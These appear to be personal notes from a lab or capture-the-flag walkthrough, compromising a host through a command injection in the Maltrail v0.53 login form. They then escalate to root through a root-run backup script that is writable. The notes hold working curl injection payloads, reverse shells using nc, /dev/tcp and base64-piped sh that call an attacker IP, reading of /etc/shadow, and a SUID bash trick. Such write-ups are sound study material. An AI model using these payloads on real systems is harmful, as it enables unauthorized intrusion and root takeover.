ports 22, 80, 8338 open
80 looks default apache
8338 is some Maltrail, nothing on searchsploit
Looking on google, we find exploit for Maltrail v0.53
looking into it, the username field in the login seems to have code injection vulnerability
--data 'username=;`echo+\\"{encoded_payload}\\"+|+base64+-d+|+sh`'"

So, Im gonna try doing it mannually

```zsh
curl http://192.168.110.32:8338/login --data 'username=;`wget+192.168.45.156/file`'
#we get a hit on out python server
#so, the next step is to replace the payload with mkfifo

curl http://192.168.110.32:8338/login --data 'username=;`mkfifo+/tmp/f;nc+192.168.45.156+22+<+/tmp/f|/bin/sh+>/tmp/f 2>&1;rm+tmp/f`'
#dont work
curl http://192.168.110.32:8338/login --data 'username=;`bash+-i+>&+/dev/tcp/192.168.45.156/22+0>&1`'
#dont work

#this tells me there's some badchars involved
#so, we goota do the base64 business

echo 'bash -i  >& /dev/tcp/191.168.45.156/22 0>&1 ' | base64

curl http://192.168.110.32:8338/login --data 'username=;`echo+"YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTkxLjE2OC40NS4xNTYvMjIgMD4mMSAK"+|base64+-d|sh`'

#none of the things worked. the only one that gave a little was
echo 'id | nc IP PORT' 
#if I add -e /bin/sh, it wouldnt work
#I guess only python rev shell works, as in the exploit
```

HINT TAKEN : https://github.com/spookier/Maltrail-v0.53-Exploit/
snort!

---
In /home/snort, we find etc_backup.tar on a silver platter
`tar -xvf etc_backup.tar` extracts everything in the /etc, including /etc/shadow, which we can now cat /home/snort/etc/shadow

now, linpeas finds a file owned by root, that is writable to us
/var/backups/etc_backup.sh
we can modify it, but we would want root to be routinely running it
Nothing in crantabs, so we send over pspy64s, and there it is
`UID=0    PID=3704   | /bin/bash /var/backups/etc_Backup.sh `
so, we just give ourselves a shell, easy

I added a few basic reverse shells, but they dont seem to work
I gotta see why, once I do get root

HINT TAKEN : give chmod u+s to /bin/bash, base64 it, and decode it with |bash
then we can get root with `bash -p`

```
└kali─$ echo 'chmod u+s /bin/bash' | base64
Y2htb2QgdStzIC9iaW4vYmFzaAo=

echo "echo 'Y2htb2QgdStzIC9iaW4vYmFzaAo=' | base64 -d | bash" > etc_Backup.sh
```

`/bin/bash -p`
root!